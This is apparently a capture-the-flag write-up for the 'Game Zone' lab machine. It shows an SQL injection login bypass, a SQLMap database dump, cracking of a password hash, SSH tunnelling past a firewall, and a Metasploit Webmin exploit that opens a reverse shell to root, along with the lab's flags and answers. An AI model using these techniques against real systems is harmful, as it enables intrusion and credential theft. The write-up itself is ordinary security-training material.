# Information

Name: Game Zone

Difficulty: Easy

Description: Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

## Network enumeration

**Search for open ports using nmap.**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Easy machine might only have one attack vector, the web site at port 80. I'll run a `rustscan` check to make sure theres no hidden ports here while I check around the site.

## Deploy the vulnerable machine

![image](https://user-images.githubusercontent.com/43668197/140319512-7b93338e-5194-48bd-bc7d-0a62770e0b24.png)

I've never played the games but I do recogonize the character from Hitman. So I do a little google searching to get his name.

**What is the name of the large cartoon avatar holding a sniper on the forum?**

agent 47


## Obtain access via SQLi

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

`SELECT * FROM users WHERE username = :username AND password := password`

In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.

**Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.**

No Answer Needed

Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials.

If we have our username as admin and our password as: `' or 1=1 -- -` it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

`SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -`

**The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.**

No Answer Needed.

GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.

Use `' or 1=1 -- -` as your username and leave the password blank.

**When you've logged in, what page do you get redirected to?**

portal.php


## Using SQLMap

We're going to use SQLMap to dump the entire database for GameZone.

Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

First we need to intercept a request made to the search feature using BurpSuite.

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

![image](https://user-images.githubusercontent.com/43668197/140320865-a3884f25-2301-4df3-8abd-cd8c8461fb9c.png)
```
-r uses the intercepted request you saved earlier
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database
```

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

**In the users table, what is the hashed password?**

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

**What was the username associated with the hashed password?**

agent47

**What was the other table name?**

post

## Cracking a password with JohnTheRipper

Once you have JohnTheRipper installed you can run it against your hash using the following arguments:

hash.txt - contains a list of your hashes (in your case its just 1 hash)
--wordlist - is the wordlist you're using to find the dehashed value
--format - is the hashing algorithm used. In our case its hashed using SHA256.

I chose to let `sqlmap` crack this password when it asked if I wanted it to. I wanted to see how long it would take and it didn't seem much different than using John. I used the `rockyou.txt` password list.

**What is the de-hashed password?**

videogamer124


Now you have a password and username. Try SSH'ing onto the machine.

**What is the user flag?**

649ac17b1480ac13ef1e4fa579dac95c

## Exposing services with reverse SSH tunnels

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

`-L` is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do `ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000` on your machine, will load imgur traffic using your other server.

`-R` is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

We will use a tool called `ss` to investigate sockets running on a host.

If we run `ss -tulpn` it will tell us what socket connections are running

Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn't resolve service names

```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q                                 Local Address:Port                                                Peer Address:Port              
udp   UNCONN     0      0                                                  *:68                                                             *:*                  
udp   UNCONN     0      0                                                  *:10000                                                          *:*                  
tcp   LISTEN     0      128                                                *:10000                                                          *:*                  
tcp   LISTEN     0      128                                                *:22                                                             *:*                  
tcp   LISTEN     0      80                                         127.0.0.1:3306                                                           *:*                  
tcp   LISTEN     0      128                                               :::80                                                            :::*                  
tcp   LISTEN     0      128                                               :::22                                                            :::* 
```

**How many TCP sockets are running?**

5

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run `ssh -L 10000:localhost:10000 <username>@<ip>`

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.

![image](https://user-images.githubusercontent.com/43668197/140375356-0b1eb946-825c-44d4-9b34-4baea16bbf3b.png)

**What is the name of the exposed CMS?**

webmin

Trying out the only set of credentials we have right now agent47:videogamer124 gets us in.

![image](https://user-images.githubusercontent.com/43668197/140375737-c5973fc3-5fce-4e71-afc4-44bf50efd6dd.png)

**What is the CMS version?**

1.580

## Privilege Escalation with Metasploit

```
msf6 > search webmin 1.58

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   
msf6 > use 0

msf6 exploit(unix/webapp/webmin_show_cgi_exec) > options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host
```

Set rhosts 127.0.0.1, set ssl false,set username agent47, and password videogamer124, set lhost <ur_ip>, and then either run or exploit.

```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run

[*] Started reverse TCP double handler on 10.13.29.43:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo WCfS4A7K0xcSSnHO;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "WCfS4A7K0xcSSnHO\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.13.29.43:4444 -> 10.10.61.25:41080 ) at 2021-11-04 12:23:43 -0400

whoami
root
```
```
cd /root
ls
root.txt
cat root.txt
a4b945830144bdd71908d12d902adeee
```

**What is the root flag?**

a4b945830144bdd71908d12d902adeee

